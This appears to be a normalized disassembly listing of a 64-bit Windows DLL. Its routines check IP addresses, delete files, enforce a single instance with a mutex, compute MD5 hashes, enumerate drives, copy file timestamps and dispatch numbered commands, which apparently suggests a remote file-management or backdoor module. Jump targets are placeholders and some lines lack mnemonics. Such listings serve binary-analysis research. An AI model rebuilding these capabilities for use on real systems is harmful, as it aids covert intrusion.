sub_180001000
sub rsp 0x38
lea rax [ rsp + 0x50 ]
mov r9 rdx
mov r8 rcx
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
xor edx edx
xor ecx ecx
call sub_18000d30c
test rax rax
je r-xdata
add rsp 0x38
retn
mov rcx rax
call [ CloseHandle@IAT ]
sub_180001038
push rbx
sub rsp 0x130
mov rbx rcx
lea rcx [ rsp + 0x21 ]
xor edx edx
mov r8d 0x103
mov [ rsp + 0x20 ] 0x0
call sub_180016870
lea rcx [ rsp + 0x20 ]
xor r9d r9d
mov r8 rbx
mov edx 0x104
call sub_18000c71c
mov rcx rax
call [ inet_addr@IAT ]
cmp eax 0xffffffff
setne al
add rsp 0x130
pop rbx
retn
sub_180001088
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rdi [ rw-data ]
mov rcx rdi
call [ GetFileAttributesW@IAT ]
mov ebx eax
test al 0x2
je r-xdata
test bl 0x4
je r-xdata
mov edx eax
mov rcx rdi
and edx 0xfffffffd
call [ SetFileAttributesW@IAT ]
test bl 0x1
je r-xdata
mov edx ebx
mov rcx rdi
and edx 0xfffffffb
call [ SetFileAttributesW@IAT ]
mov rcx rdi
call [ DeleteFileW@IAT ]
mov rbx [ rsp + 0x30 ]
test eax eax
setne al
add rsp 0x20
pop rdi
retn
and ebx 0xfffffffe
mov rcx rdi
mov edx ebx
call [ SetFileAttributesW@IAT ]
sub_1800010f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x250
mov rax [ r--data ]
lea rcx [ rsp + 0x40 ]
xor ebx ebx
mov [ rcx ] rax
mov rax [ r--data ]
xor edx edx
mov [ rcx + 0x8 ] rax
mov rax [ r--data ]
mov r8d 0x1ee
mov [ rcx + 0x10 ] rax
movzx eax [ r--data ]
mov [ rsp + 0x30 ] 0x1
mov [ rcx + 0x18 ] ax
lea rcx [ rsp + 0x5a ]
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] 0x18
call sub_180016870
lea r11 [ rw-data ]
lea rdi [ r--data ]
lea ecx [ rbx + 0x8 ]
mov rsi r11
xor eax eax
[ rsi ] [ rdi ]
lea rdi [ rsp + 0x40 ]
je r-xdata
or rcx 0xffffffffffffffff
lea rdx [ rw-data ]
[ rdi ]
xor ecx ecx
or rcx 0xffffffffffffffff
[ rdi ]
xor ecx ecx
movzx eax [ rdx + rcx ]
add rcx 0x2
mov [ rdi + rcx - 0x4 ] ax
test ax ax
jne r-xdata
lea r8 [ rsp + 0x40 ]
lea rcx [ rsp + 0x20 ]
xor edx edx
call [ CreateMutexW@IAT ]
mov [ rw-data ] rax
call [ GetLastError@IAT ]
lea r11 [ rsp + 0x250 ]
mov rsi [ r11 + 0x18 ]
cmp eax 0xb7
setne bl
mov eax ebx
mov rbx [ r11 + 0x10 ]
mov rsp r11
pop rdi
retn
movzx eax [ r11 + rcx ]
add rcx 0x2
mov [ rdi + rcx - 0x4 ] ax
test ax ax
jne r-xdata
jmp r-xdata
sub_180001268
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov eax [ rdx + 0x10 ]
mov rdi rdx
mov esi r9d
lea r10d [ rax + r9 * 8 ]
mov edx eax
mov eax r9d
shr edx 0x3
shl eax 0x3
mov r12 r8
and edx 0x3f
mov rbp rcx
mov [ rdi + 0x10 ] r10d
cmp r10d eax
jae r-xdata
mov eax r9d
mov ebx 0x40
shr eax 0x1d
sub ebx edx
add [ rdi + 0x14 ] eax
cmp r9d ebx
jb r-xdata
inc [ rdi + 0x14 ]
xor ebx ebx
lea rdx [ rdx + rdi + 0x18 ]
mov r9d ebx
call sub_180001c78
lea r8 [ rdi + 0x18 ]
mov rdx rdi
mov rcx rbp
call sub_1800013e4
jmp r-xdata
lea eax [ rbx + 0x3f ]
cmp eax esi
jb r-xdata
mov r8d ebx
mov rdx rdi
mov rcx rbp
add r8 r12
call sub_1800013e4
add ebx 0x40
xor edx edx
jmp r-xdata
sub esi ebx
mov r8d ebx
lea rdx [ rdx + rdi + 0x18 ]
add r8 r12
mov r9d esi
mov rcx rbp
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
jmp sub_180001c78
sub_180001334
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rsi r8
lea rdx [ rsp + 0x40 ]
mov r9d 0x8
add r8 0x10
mov rdi rcx
call sub_180001bf8
mov r11d [ rsi + 0x10 ]
lea eax [ r9 + 0x30 ]
shr r11d 0x3
mov r9d 0x78
lea r8 [ rw-data ]
and r11d 0x3f
mov rdx rsi
mov rcx rdi
sub eax r11d
sub r9d r11d
cmp r11d 0x38
cmovb r9d eax
call sub_180001268
lea r8 [ rsp + 0x40 ]
mov r9d 0x8
mov rdx rsi
mov rcx rdi
call sub_180001268
mov r9d 0x10
mov r8 rsi
mov rdx rbx
mov rcx rdi
call sub_180001bf8
mov r9d 0x58
xor r8d r8d
mov rdx rsi
mov rcx rdi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
jmp sub_180001c94
sub_1800013e4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
mov r10d [ rdx + 0x4 ]
mov ebx [ rdx + 0x8 ]
mov r11d [ rdx + 0xc ]
mov rdi rdx
lea rdx [ rax - 0x68 ]
mov r9d 0x40
call sub_180001c38
mov r15d [ rsp + 0x34 ]
mov ecx r10d
not ecx
mov eax ebx
and ecx r11d
and eax r10d
or ecx eax
mov eax [ rsp + 0x20 ]
add ecx [ rdi ]
lea edx [ rcx + rax - 0x28955b88 ]
mov eax r10d
rol edx 0x7
add edx r10d
and eax edx
mov ecx edx
not ecx
and ecx ebx
or ecx eax
add ecx [ rsp + 0x24 ]
lea r8d [ rcx + r11 - 0x173848aa ]
rol r8d 0xc
add r8d edx
mov ecx r8d
mov eax r8d
not ecx
and eax edx
and ecx r10d
or ecx eax
mov eax r8d
add ecx [ rsp + 0x28 ]
lea r9d [ rcx + rbx + 0x242070db ]
ror r9d 0xf
add r9d r8d
and eax r9d
mov ecx r9d
not ecx
and ecx edx
or ecx eax
mov eax r9d
add ecx [ rsp + 0x2c ]
lea r10d [ rcx + r10 - 0x3e423112 ]
ror r10d 0xa
add r10d r9d
and eax r10d
mov ecx r10d
not ecx
and ecx r8d
or ecx eax
mov eax r10d
add ecx [ rsp + 0x30 ]
lea r11d [ rcx + rdx - 0xa83f051 ]
rol r11d 0x7
add r11d r10d
and eax r11d
mov ecx r11d
not ecx
and ecx r9d
or ecx eax
add ecx r15d
lea edx [ rcx + r8 + 0x4787c62a ]
rol edx 0xc
add edx r11d
mov ecx edx
mov eax edx
not ecx
and eax r11d
and ecx r10d
or ecx eax
add ecx [ rsp + 0x38 ]
lea r8d [ rcx + r9 - 0x57cfb9ed ]
ror r8d 0xf
add r8d edx
mov ecx r8d
not ecx
and ecx r11d
mov r12d [ rsp + 0x3c ]
mov r13d [ rsp + 0x48 ]
mov ebp [ rsp + 0x50 ]
mov r14d [ rsp + 0x54 ]
mov esi [ rsp + 0x58 ]
mov eax edx
and eax r8d
or ecx eax
mov eax r8d
add ecx r12d
lea r9d [ rcx + r10 - 0x2b96aff ]
ror r9d 0xa
add r9d r8d
and eax r9d
mov ecx r9d
not ecx
and ecx edx
or ecx eax
mov eax r9d
add ecx [ rsp + 0x40 ]
lea r10d [ rcx + r11 + 0x698098d8 ]
rol r10d 0x7
add r10d r9d
and eax r10d
mov ecx r10d
not ecx
and ecx r8d
or ecx eax
add ecx [ rsp + 0x44 ]
lea edx [ rcx + rdx - 0x74bb0851 ]
rol edx 0xc
add edx r10d
mov ecx edx
mov eax edx
not ecx
and eax r10d
and ecx r9d
or ecx eax
mov eax edx
add ecx r13d
lea edi [ rcx + r8 - 0xa44f ]
ror edi 0xf
add edi edx
and eax edi
mov ecx edi
not ecx
and ecx r10d
or ecx eax
mov eax edi
add ecx [ rsp + 0x4c ]
lea r9d [ rcx + r9 - 0x76a32842 ]
ror r9d 0xa
add r9d edi
and eax r9d
mov ecx r9d
not ecx
and ecx edx
or ecx eax
mov eax r9d
add ecx ebp
lea r11d [ rcx + r10 + 0x6b901122 ]
rol r11d 0x7
add r11d r9d
and eax r11d
mov ecx r11d
not ecx
and ecx edi
or ecx eax
add ecx r14d
lea ebx [ rcx + rdx - 0x2678e6d ]
rol ebx 0xc
add ebx r11d
mov r8d ebx
mov eax ebx
and eax r11d
not r8d
mov ecx r8d
and ecx r9d
or ecx eax
add ecx esi
lea r10d [ rcx + rdi - 0x5986bc72 ]
mov edi [ rsp + 0x5c ]
mov eax ebx
ror r10d 0xf
add r10d ebx
and eax r10d
and r8d r10d
mov edx r10d
not edx
mov ecx edx
and ecx r11d
or ecx eax
mov eax ebx
add ecx edi
lea r9d [ rcx + r9 + 0x49b40821 ]
ror r9d 0xa
add r9d r10d
and eax r9d
and edx r9d
mov ecx r9d
or r8d eax
not ecx
mov eax r10d
add r8d [ rsp + 0x24 ]
lea r11d [ r8 + r11 - 0x9e1da9e ]
rol r11d 0x5
add r11d r9d
and ecx r11d
and eax r11d
or edx eax
add edx [ rsp + 0x38 ]
lea r8d [ rdx + rbx - 0x3fbf4cc0 ]
rol r8d 0x9
add r8d r11d
mov eax r8d
and eax r9d
or ecx eax
add ecx [ rsp + 0x4c ]
lea edx [ rcx + r10 + 0x265e5a51 ]
mov ecx r11d
not ecx
rol edx 0xe
and ecx r8d
add edx r8d
mov eax edx
and eax r11d
or ecx eax
mov eax r8d
add ecx [ rsp + 0x20 ]
lea r10d [ rcx + r9 - 0x16493856 ]
mov ecx r8d
not ecx
ror r10d 0xc
and ecx edx
add r10d edx
and eax r10d
or ecx eax
mov eax edx
add ecx r15d
lea r9d [ rcx + r11 - 0x29d0efa3 ]
mov ecx edx
not ecx
rol r9d 0x5
and ecx r10d
add r9d r10d
and eax r9d
or ecx eax
add ecx r13d
lea r11d [ rcx + r8 + 0x2441453 ]
mov ecx r10d
rol r11d 0x9
not ecx
and ecx r9d
add r11d r9d
mov eax r11d
and eax r10d
or ecx eax
add ecx edi
lea r8d [ rcx + rdx - 0x275e197f ]
rol r8d 0xe
add r8d r11d
mov ecx r9d
mov eax r8d
not ecx
and eax r9d
and ecx r11d
or ecx eax
mov eax r11d
add ecx [ rsp + 0x30 ]
lea edx [ rcx + r10 - 0x182c0438 ]
mov ecx r11d
not ecx
ror edx 0xc
and ecx r8d
add edx r8d
and eax edx
or ecx eax
mov eax r8d
add ecx [ rsp + 0x44 ]
lea r10d [ rcx + r9 + 0x21e1cde6 ]
mov ecx r8d
not ecx
rol r10d 0x5
and ecx edx
add r10d edx
and eax r10d
or ecx eax
add ecx esi
lea r9d [ rcx + r11 - 0x3cc8f82a ]
mov ecx edx
not ecx
rol r9d 0x9
and ecx r10d
add r9d r10d
mov eax r9d
and eax edx
or ecx eax
add ecx [ rsp + 0x2c ]
lea r11d [ rcx + r8 - 0xb2af279 ]
mov ecx r10d
not ecx
rol r11d 0xe
and ecx r9d
add r11d r9d
mov eax r11d
and eax r10d
or ecx eax
mov eax r9d
add ecx [ rsp + 0x40 ]
lea ebx [ rcx + rdx + 0x455a14ed ]
mov ecx r9d
not ecx
ror ebx 0xc
and ecx r11d
add ebx r11d
and eax ebx
or ecx eax
mov eax r11d
add ecx r14d
lea edx [ rcx + r10 - 0x561c16fb ]
mov ecx r11d
not ecx
rol edx 0x5
and ecx ebx
add edx ebx
and eax edx
or ecx eax
add ecx [ rsp + 0x28 ]
lea r8d [ rcx + r9 - 0x3105c08 ]
mov ecx ebx
not ecx
rol r8d 0x9
and ecx edx
add r8d edx
mov eax r8d
and eax ebx
or ecx eax
add ecx r12d
lea r9d [ rcx + r11 + 0x676f02d9 ]
mov ecx edx
rol r9d 0xe
add r9d r8d
not ecx
mov eax r9d
and eax edx
and ecx r8d
or ecx eax
mov eax r8d
xor eax r9d
add ecx ebp
lea r10d [ rcx + rbx - 0x72d5b376 ]
mov ebx [ rsp + 0x20 ]
ror r10d 0xc
add r10d r9d
xor eax r10d
add eax r15d
lea edx [ rax + rdx - 0x5c6be ]
mov eax r9d
xor eax r10d
rol edx 0x4
add edx r10d
xor eax edx
add eax [ rsp + 0x40 ]
lea r8d [ rax + r8 - 0x788e097f ]
rol r8d 0xb
add r8d edx
mov eax r8d
mov ecx r8d
xor eax r10d
xor eax edx
add eax [ rsp + 0x4c ]
lea r9d [ rax + r9 + 0x6d9d6122 ]
rol r9d 0x10
add r9d r8d
xor ecx r9d
mov eax ecx
xor eax edx
add eax esi
lea r10d [ rax + r10 - 0x21ac7f4 ]
mov eax r9d
ror r10d 0x9
add r10d r9d
xor eax r10d
xor ecx r10d
add ecx [ rsp + 0x24 ]
lea r11d [ rcx + rdx - 0x5b4115bc ]
rol r11d 0x4
add r11d r10d
xor eax r11d
add eax [ rsp + 0x30 ]
lea edx [ rax + r8 + 0x4bdecfa9 ]
rol edx 0xb
add edx r11d
mov eax edx
mov ecx edx
xor eax r10d
xor eax r11d
add eax r12d
lea r8d [ rax + r9 - 0x944b4a0 ]
rol r8d 0x10
add r8d edx
xor ecx r8d
mov eax ecx
xor eax r11d
add eax r13d
lea r9d [ rax + r10 - 0x41404390 ]
mov eax r8d
ror r9d 0x9
add r9d r8d
xor eax r9d
xor ecx r9d
add ecx r14d
lea r10d [ rcx + r11 + 0x289b7ec6 ]
rol r10d 0x4
add r10d r9d
xor eax r10d
add eax ebx
lea r11d [ rax + rdx - 0x155ed806 ]
rol r11d 0xb
add r11d r10d
mov eax r11d
xor eax r9d
xor eax r10d
add eax [ rsp + 0x2c ]
mov ecx r11d
lea r8d [ rax + r8 - 0x2b10cf7b ]
rol r8d 0x10
add r8d r11d
xor ecx r8d
mov eax ecx
xor eax r10d
add eax [ rsp + 0x38 ]
lea edx [ rax + r9 + 0x4881d05 ]
mov eax r8d
ror edx 0x9
add edx r8d
xor eax edx
xor ecx edx
add ecx [ rsp + 0x44 ]
lea r9d [ rcx + r10 - 0x262b2fc7 ]
rol r9d 0x4
add r9d edx
xor eax r9d
add eax ebp
lea ecx [ rax + r11 - 0x1924661b ]
rol ecx 0xb
add ecx r9d
mov eax ecx
xor eax edx
xor eax r9d
add eax edi
lea r10d [ rax + r8 + 0x1fa27cf8 ]
mov eax ecx
rol r10d 0x10
add r10d ecx
xor eax r10d
xor eax r9d
add eax [ rsp + 0x28 ]
lea r8d [ rax + rdx - 0x3b53a99b ]
mov eax ecx
not eax
ror r8d 0x9
add r8d r10d
or eax r8d
xor eax r10d
add eax ebx
lea edx [ rax + r9 - 0xbd6ddbc ]
mov eax r10d
not eax
rol edx 0x6
add edx r8d
or eax edx
xor eax r8d
add eax r12d
lea r9d [ rax + rcx + 0x432aff97 ]
mov eax r8d
not eax
rol r9d 0xa
add r9d edx
or eax r9d
xor eax edx
add eax esi
lea ecx [ rax + r10 - 0x546bdc59 ]
mov eax edx
not eax
rol ecx 0xf
add ecx r9d
or eax ecx
xor eax r9d
add eax r15d
lea r10d [ rax + r8 - 0x36c5fc7 ]
mov eax r9d
not eax
ror r10d 0xb
add r10d ecx
or eax r10d
xor eax ecx
add eax ebp
lea r8d [ rax + rdx + 0x655b59c3 ]
mov eax ecx
rol r8d 0x6
not eax
add r8d r10d
or eax r8d
xor eax r10d
add eax [ rsp + 0x2c ]
lea edx [ rax + r9 - 0x70f3336e ]
mov eax r10d
not eax
rol edx 0xa
add edx r8d
or eax edx
xor eax r8d
add eax r13d
lea r9d [ rax + rcx - 0x100b83 ]
mov eax r8d
not eax
rol r9d 0xf
add r9d edx
or eax r9d
xor eax edx
add eax [ rsp + 0x24 ]
lea ecx [ rax + r10 - 0x7a7ba22f ]
mov eax edx
not eax
ror ecx 0xb
add ecx r9d
or eax ecx
xor eax r9d
add eax [ rsp + 0x40 ]
lea r10d [ rax + r8 + 0x6fa87e4f ]
mov eax r9d
not eax
rol r10d 0x6
add r10d ecx
or eax r10d
xor eax ecx
add eax edi
lea r11d [ rax + rdx - 0x1d31920 ]
mov eax ecx
not eax
rol r11d 0xa
add r11d r10d
or eax r11d
xor eax r10d
add eax [ rsp + 0x38 ]
lea r9d [ rax + r9 - 0x5cfebcec ]
mov eax r10d
not eax
rol r9d 0xf
add r9d r11d
or eax r9d
xor eax r11d
add eax r14d
lea ebx [ rax + rcx + 0x4e0811a1 ]
mov eax r11d
not eax
ror ebx 0xb
add ebx r9d
or eax ebx
xor eax r9d
add eax [ rsp + 0x30 ]
lea r8d [ rax + r10 - 0x8ac817e ]
mov eax r9d
not eax
rol r8d 0x6
add r8d ebx
or eax r8d
xor eax ebx
add eax [ rsp + 0x4c ]
lea edx [ rax + r11 - 0x42c50dcb ]
mov eax ebx
not eax
rol edx 0xa
add edx r8d
or eax edx
xor eax r8d
add eax [ rsp + 0x28 ]
lea ecx [ rax + r9 + 0x2ad7d2bb ]
mov r9 [ rsp + 0x98 ]
mov eax [ r9 ]
rol ecx 0xf
add ecx edx
add eax r8d
mov [ r9 ] eax
not r8d
lea r11 [ rsp + 0x60 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
or r8d ecx
xor r8d edx
add r8d [ rsp + 0x44 ]
lea eax [ r8 + rbx - 0x14792c6f ]
mov rbx [ r11 + 0x30 ]
ror eax 0xb
add eax [ r9 + 0x4 ]
add eax ecx
mov [ r9 + 0x4 ] eax
mov eax [ r9 + 0x8 ]
add eax ecx
mov [ r9 + 0x8 ] eax
mov eax [ r9 + 0xc ]
add eax edx
mov [ r9 + 0xc ] eax
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_180001bf8
test r9d r9d
je r-xdata
retn
lea rcx [ rdx + 0x1 ]
lea rdx [ r8 + 0x2 ]
lea r8d [ r9 - 0x1 ]
shr r8d 0x2
inc r8d
mov al [ rdx - 0x2 ]
mov [ rcx - 0x1 ] al
mov al [ rdx - 0x1 ]
mov [ rcx ] al
mov al [ rdx ]
add rcx 0x4
mov [ rcx - 0x3 ] al
mov al [ rdx + 0x1 ]
add rdx 0x4
sub r8 0x1
mov [ rcx - 0x2 ] al
jne r-xdata
sub_180001c38
add r8 0x2
mov r9d 0x10
movzx eax [ r8 ]
movzx ecx [ r8 + 0x1 ]
add r8 0x4
shl ecx 0x8
or ecx eax
movzx eax [ r8 - 0x5 ]
shl ecx 0x8
or ecx eax
movzx eax [ r8 - 0x6 ]
shl ecx 0x8
or ecx eax
mov [ rdx ] ecx
add rdx 0x4
sub r9 0x1
jne r-xdata
retn
sub_180001cb4
push rbx
sub rsp 0x40
and [ rsp + 0x30 ] 0x0
mov rax rdx
xor r9d r9d
mov rbx rcx
lea r8d [ r9 + 0x1 ]
mov edx 0x80000000
mov rcx rax
mov [ rsp + 0x28 ] 0x80
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov [ rbx + 0x8 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea rdx [ rbx + 0x204c ]
mov rcx rbx
call sub_180001244
mov al 0x1
xor al al
jmp r-xdata
add rsp 0x40
pop rbx
retn
sub_180001d10
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
lea rsi [ rcx + 0x2014 ]
mov rdi rdx
lea r8 [ rcx + 0x204c ]
mov rdx rsi
mov r12 rcx
call sub_180001334
lea rbx [ r12 + 0x2028 ]
mov ebp 0x10
movzx r8d [ rsi ]
lea rdx [ r--data ]
mov rcx rbx
call sub_18000d67c
add rbx 0x2
inc rsi
sub rbp 0x1
jne r-xdata
xor ecx ecx
mov al [ r12 + rcx + 0x2028 ]
mov [ rcx + rdi ] al
inc rcx
cmp rcx 0x20
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov [ rdi + 0x20 ] 0x0
mov rax rdi
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
sub_180001db8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
and [ rsp + 0x20 ] 0x0
mov rbx rcx
lea r9 [ rcx + 0x10 ]
lea rdx [ rcx + 0x14 ]
mov rcx [ rcx + 0x8 ]
mov r8d 0x2000
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov r9d [ rbx + 0x10 ]
test r9d r9d
je r-xdata
xor al al
jmp r-xdata
lea rdx [ rbx + 0x204c ]
lea r8 [ rbx + 0x14 ]
mov rcx rbx
call sub_180001268
mov al 0x1
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180001e20
push rbx
sub rsp 0x270
mov rbx rdx
lea rdx [ rsp + 0x20 ]
call [ FindFirstFileW@IAT ]
cmp rax 0xffffffffffffffff
jne r-xdata
mov rcx rax
call [ FindClose@IAT ]
mov rax [ rsp + 0x24 ]
mov ecx [ rsp + 0x3c ]
mov r11d [ rsp + 0x20 ]
mov [ rbx + 0x4 ] rax
mov rax [ rsp + 0x2c ]
mov [ rbx + 0xc ] rax
mov rax [ rsp + 0x34 ]
shl rcx 0x20
mov [ rbx + 0x14 ] rax
mov eax [ rsp + 0x40 ]
lea rdx [ rbx + 0x28 ]
add rcx rax
lea rax [ rsp + 0x4c ]
mov [ rbx ] r11d
mov [ rbx + 0x20 ] rcx
sub rdx rax
lea rcx [ rsp + 0x4c ]
xor al al
jmp r-xdata
movzx eax [ rcx ]
mov [ rdx + rcx ] ax
add rcx 0x2
test ax ax
jne r-xdata
mov al 0x1
add rsp 0x270
pop rbx
retn
sub_180001eac
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
push rdi
sub rsp 0x40
mov eax [ rdx ]
mov rdi rdx
mov edx 0xc0000000
and al 0x10
mov rbp rcx
neg al
sbb r8d r8d
and [ r11 - 0x18 ] 0x0
xor r9d r9d
and r8d 0x1ffff80
sub r8d 0xffffff80
mov [ r11 - 0x20 ] r8d
lea r8d [ r9 + 0x5 ]
mov [ rsp + 0x20 ] 0x3
call [ CreateFileW@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
lea r9 [ rdi + 0x14 ]
lea r8 [ rdi + 0xc ]
lea rdx [ rdi + 0x4 ]
mov rcx rax
call [ SetFileTime@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
xor al al
jmp r-xdata
mov rcx rsi
call [ CloseHandle@IAT ]
mov al bl
mov edx [ rdi ]
mov rcx rbp
call [ SetFileAttributesW@IAT ]
test eax eax
setne bl
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
sub_180001fc8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x450
mov rdi rcx
mov rbx rdx
mov esi 0x208
lea rcx [ rsp + 0x30 ]
xor edx edx
mov r8 rsi
call sub_180016870
lea rcx [ rsp + 0x240 ]
mov r8 rsi
xor edx edx
call sub_180016870
lea rdx [ rsp + 0x30 ]
mov r9d 0x20
mov r8d 0x104
mov rcx rbx
mov [ rsp + 0x20 ] 0x0
call sub_18000cb20
test rax rax
je r-xdata
lea r8 [ rsp + 0x30 ]
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_18000c710
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea r8 [ r--data ]
lea rcx [ rsp + 0x240 ]
mov r9 rax
mov rdx rsi
call sub_18000d718
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
xor edx edx
call sub_180001f88
xor eax eax
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_1800022c0
jmp r-xdata
lea r11 [ rsp + 0x450 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_1800025f4
jmp r-xdata
mov eax 0x1
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_1800026d4
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_1800027f8
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002d9c
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002cf8
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002d20
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002e78
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002f5c
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002ca0
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_180002e18
jmp r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x30 ]
call sub_180001fa8
mov rcx rdi
test eax eax
je r-xdata
lea rdx [ rsp + 0x240 ]
call sub_1800030e0
jmp r-xdata
mov edx 0x16
call sub_180001f88
lea rdx [ rsp + 0x240 ]
call sub_18000328c
jmp r-xdata
sub_1800022c0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x6b0
mov rsi rcx
mov r12 rdx
mov r15d 0x230
lea rcx [ rsp + 0x20 ]
mov edx 0xff
mov r8 r15
call sub_180016870
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r12
[ rdi ]
not rcx
cmp rcx 0x1
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x4a0 ]
xor ebx ebx
mov r8 r12
mov ebp ebx
call sub_18000d138
lea rdx [ rsp + 0x250 ]
lea rcx [ rsp + 0x4a0 ]
call [ FindFirstFileW@IAT ]
mov r13 rax
cmp rax 0xffffffffffffffff
jne r-xdata
xor edx edx
mov rcx rsi
call sub_180001f88
xor ebx ebx
lea rcx [ rsi + 0x10 ]
lea rdx [ r--data ]
mov r8 r12
call sub_18000d138
xor edx edx
mov rcx rsi
call sub_180001f88
call [ GetLastError@IAT ]
mov rcx rsi
mov edx eax
call sub_180001f88
or eax r13d
jmp r-xdata
inc ebx
cmp ebx 0x1a
jl r-xdata
mov rcx [ rsi ]
lea r8d [ rdi + 0x12d ]
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] eax
call sub_18000a1ac
lea rdx [ rsp + 0x250 ]
mov rcx r13
call [ FindNextFileW@IAT ]
cmp eax ebx
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x27c ]
call sub_18000d5e8
cmp eax ebx
je r-xdata
lea r11 [ rsp + 0x6b0 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r15
pop r13
pop r12
retn
lea r8d [ rbx + 0x41 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x48 ]
call sub_18000d138
lea rcx [ rsp + 0x48 ]
mov edi eax
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
je r-xdata
lea rcx [ rsp + 0x20 ]
mov r8 r15
xor edx edx
call sub_180016870
mov rcx [ rsi ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x12c
call sub_18000a1ac
xor eax eax
jmp r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x27c ]
call sub_18000d5e8
cmp eax ebx
je r-xdata
lea rcx [ rsp + 0x20 ]
mov r8 r15
xor edx edx
call sub_180016870
mov rcx [ rsi ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x12c
call sub_18000a1ac
mov rcx r13
